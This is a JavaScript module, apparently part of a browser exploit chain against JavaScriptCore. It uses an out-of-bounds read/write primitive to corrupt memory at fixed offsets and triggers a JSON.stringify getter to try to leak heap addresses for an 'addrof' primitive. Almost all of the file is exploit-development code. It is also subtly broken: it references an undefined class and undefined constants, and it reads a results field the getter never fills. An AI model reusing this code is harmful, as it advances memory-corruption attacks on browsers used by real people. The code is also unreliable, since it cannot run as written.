// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAddrOf";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    results_at_0x6C: [] // Armazenará {pattern_planted_low, value_after_stringify_qword}
};

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_WRITE_OFFSET_0x6C = 0x6C; 

// Padrões para plantar nos 4 bytes baixos de 0x6C
const LOW_DWORD_PATTERNS_TO_TEST = [
    0xFEFEFEFE, 
    0xCDCDCDCD, 
    0x12345678, 
    0x00000000,
    0xABABABAB, // Novo padrão de preenchimento geral
    // Adicionar aqui offsets relativos a oob_array_buffer_real que podem ser interessantes se usados como ponteiro
    // Ex: 0x200 (onde poderíamos plantar uma string falsa ou outra estrutura)
    // Mas o Stringifier escreveria 0xFFFFFFFF nos 4 bytes altos DESTE valor.
];

let global_object_for_addrof_target_in_getter;

class CheckpointFor0x6CAddrOf {
    constructor(id) {
        this.id_marker = `Analyse0x6CAddrOfChkpt-${id}`;
        this.prop_for_stringify = null; // Será preenchido com global_object_for_addrof_target_in_getter
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "Analyse0x6CAddrOf_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results.message = "Getter chamado, analisando escrita do Stringifier em 0x6C.";
        let details_log_g = [];
        
        // O padrão que foi plantado em 0x6C pelo runner está implicitamente aqui.
        // O JSON.stringify externo já está processando `this` (e sua prop_for_stringify).
        // O Stringifier (corrompido) pode ter usado o valor em oob_data[0x70] e pode ter escrito em 0x6C.

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_ab ou oob_read_absolute não disponíveis.");
            }
            
            // Ler o valor ATUAL em 0x6C após o JSON.stringify externo (que acionou este getter) ter feito seu trabalho.
            const value_at_0x6C_after_trigger = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            const val_str_0x6C = value_at_0x6C_after_trigger.toString(true);
            details_log_g.push(`Valor em oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] APÓS trigger/stringify externo: ${val_str_0x6C}`);
            logS3(details_log_g[details_log_g.length-1], "leak", FNAME_GETTER);

            // Adicionar ao array global de resultados para este padrão específico
            // A variável 'current_pattern_planted_at_0x6C' precisaria ser passada ou acessível globalmente
            // para registrar qual padrão levou a qual resultado. Isso é complexo para este fluxo.
            // Por enquanto, apenas logamos. O sumário no runner mostrará o padrão plantado.
            // A estrutura current_test_results será por sub-teste no runner.

            // Heurística: Se a parte alta é 0xFFFFFFFF e a baixa NÃO é o padrão original
            // E se a parte baixa parece um ponteiro de heap (isso é mais difícil de julgar sem contexto)
            if (value_at_0x6C_after_trigger.high() === 0xFFFFFFFF) {
                 // O log no runner já mostrará o padrão plantado e este valor lido.
                 // Se value_at_0x6C_after_trigger.low() for diferente do padrão plantado,
                 // e se assemelhar a parte de um endereço de heap, é um GRANDE achado.
                 // Por exemplo, se global_object_for_addrof_target_in_getter = {id: SOME_UNIQUE_ID}
                 // e value_at_0x6C_after_trigger.low() for parte do endereço de um objeto com SOME_UNIQUE_ID.
                 // Isso requer mais análise offline dos valores vazados.
                 logS3(`Valor em ${toHex(TARGET_WRITE_OFFSET_0x6C)} tem 0xFFFFFFFF na parte alta. Parte baixa: ${toHex(value_at_0x6C_after_trigger.low())}`, "vuln", FNAME_GETTER);
                 // Marcar sucesso se a parte alta for FFFFFFFF e a baixa não for o padrão que deveria estar lá
                 // (o padrão de preenchimento geral, se o padrão específico do sub-teste não foi o último escrito)
                 // Esta lógica de sucesso precisa ser refinada no runner com base no padrão plantado.
            }

            current_test_results.details = details_log_g.join('; ');
            // O sucesso será determinado no runner comparando o padrão plantado com o lido.

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
        }
        return { "getter_0x6C_analysis_v2_done": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAddrOf.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { 
            id: this.id_marker, 
            stringified_target_prop: this.prop_for_stringify, // Para garantir que o Stringifier o processe
            processed_by_0x6c_addrof_test: true 
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "execute0x6CAnalysisRunnerV2";
    logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (v2) ---`, "test", FNAME_TEST_RUNNER);

    let overall_summary_for_0x6c_test = [];

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    for (const initial_low_dword_pattern of LOW_DWORD_PATTERNS_TO_TEST) {
        getter_called_flag = false; // Reset para cada sub-teste
        current_test_results = { // Reset para cada sub-teste
            success: false, message: `Testando com padrão inicial ${toHex(initial_low_dword_pattern)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}.`, 
            error: null, writes_at_0x6C: [], details: ""
        };
        global_object_for_addrof_target_in_getter = null; // Resetar antes de cada sub-teste

        logS3(`INICIANDO SUB-TESTE: Padrão inicial em ${toHex(TARGET_WRITE_OFFSET_0x6C)} será ${toHex(initial_low_dword_pattern)}`, "subtest", FNAME_TEST_RUNNER);

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { throw new Error("OOB Init falhou"); }
            logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
            
            // 1. Preencher a área de sondagem com um padrão geral, exceto 0x6C e 0x70
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 4)) {
                    continue; 
                }
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN, 4); } catch(e){}
            }
            // Escrever o padrão de teste específico em 0x6C (os 4 bytes baixos)
            // Os 4 bytes altos de 0x6C (em 0x70-3) não devem ser o padrão, deixe como estava ou zero.
            // Vamos zerar os 4 bytes altos de 0x6C (em 0x6C+4 = 0x70, mas é onde o trigger vai)
            // Para ser seguro, apenas escrevemos o padrão de 4 bytes em 0x6C.
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_pattern, 4);
            logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (DWORD) = ${toHex(initial_low_dword_pattern)}.`, "info", FNAME_TEST_RUNNER);
            
            // 2. Objeto alvo global para o stress_obj no getter
            global_object_for_addrof_target_in_getter = { "unique_id": 0xC0FFEE00 + initial_low_dword_pattern };

            // 3. Escrita OOB Gatilho em 0x70
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1);
            checkpoint_obj.prop_for_stringify = global_object_for_addrof_target_in_getter; // Passar o alvo
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
            
            JSON.stringify(checkpoint_obj); // Aciona o getter

            // Após o getter ser chamado, current_test_results foi atualizado por ele.
            // A lógica de sucesso específica baseada no padrão plantado vs. lido.
            if (getter_called_flag && current_test_results.writes_at_0x6C.length > 0) {
                const final_qword_at_0x6C_str = current_test_results.writes_at_0x6C[0].value_after_stringify; // O getter armazena isso
                const final_qword_at_0x6C = new AdvancedInt64(final_qword_at_0x6C_str); // Reconstituir

                if (final_qword_at_0x6C.high() === 0xFFFFFFFF && final_qword_at_0x6C.low() !== initial_low_dword_pattern) {
                    current_test_results.success = true;
                    current_test_results.message = `VAZAMENTO EM 0x6C! Padrão Baixo ${toHex(initial_low_dword_pattern)} mudou para ${toHex(final_qword_at_0x6C.low())} com Alto FFFFFFFF!`;
                    logS3(current_test_results.message, "vuln", FNAME_TEST_RUNNER);
                } else if (final_qword_at_0x6C.high() === 0xFFFFFFFF) {
                    current_test_results.message = `Escrita em 0x6C confirmada (Alto FFFFFFFF), Baixo (${toHex(final_qword_at_0x6C.low())}) igual ao padrão plantado.`;
                } else {
                    current_test_results.message = `Valor em 0x6C (${final_qword_at_0x6C_str}) não teve Alto FFFFFFFF como esperado.`;
                }
            } else if (getter_called_flag) {
                 current_test_results.message = current_test_results.message || "Getter chamado, mas sem dados de 0x6C no resultado.";
            }


        } catch (mainError_runner) { 
            current_test_results.message = `Erro CRÍTICO no sub-teste: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
            logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
        } finally {
            logS3(`FIM DO SUB-TESTE com padrão inicial ${toHex(initial_low_dword_pattern)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
            if (getter_called_flag) {
                logS3(`  Resultado Sub-Teste: Success=${current_test_results.success}, Msg=${current_test_results.message}`, current_test_results.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                if(current_test_results.writes_at_0x6C && current_test_results.writes_at_0x6C.length > 0) {
                     logS3(`    Valor final em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${current_test_results.writes_at_0x6C[0].value_after_stringify}`, "leak", FNAME_TEST_RUNNER);
                }
            } else {
                logS3(`  Resultado Sub-Teste: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
            }
            overall_summary_for_0x6c_test.push({pattern_planted: toHex(initial_low_dword_pattern), results: JSON.parse(JSON.stringify(current_test_results)) });
            clearOOBEnvironment();
            global_object_for_addrof_target_in_getter = null;
            if (initial_low_dword_pattern !== LOW_DWORD_PATTERNS_TO_TEST[LOW_DWORD_PATTERNS_TO_TEST.length -1]) {
                 await PAUSE_S3(250); // Pausa entre sub-testes
            }
        }
    }

    // Log do Sumário Geral
    logS3("==== SUMÁRIO GERAL DO TESTE DE ESCRITA EM 0x6C (v2) ====", "test", FNAME_TEST_RUNNER);
    overall_summary_for_0x6c_test.forEach(res_item => {
        logS3(`Padrão Inicial Plantado em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.pattern_planted}`, "info", FNAME_TEST_RUNNER);
        const r = res_item.results;
        logS3(`  Getter Chamado: ${r.message.startsWith("Getter chamado") || r.success || r.error !== null}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso do Teste (Leak/Anomalia em 0x6C): ${r.success}`, r.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem Final: ${r.message}`, "info", FNAME_TEST_RUNNER);
        if(r.writes_at_0x6C && r.writes_at_0x6C.length > 0){
            logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${r.writes_at_0x6C[0].value_after_stringify}`, "leak", FNAME_TEST_RUNNER);
        }
        if (r.error) logS3(`  Erro: ${r.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C (v2) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
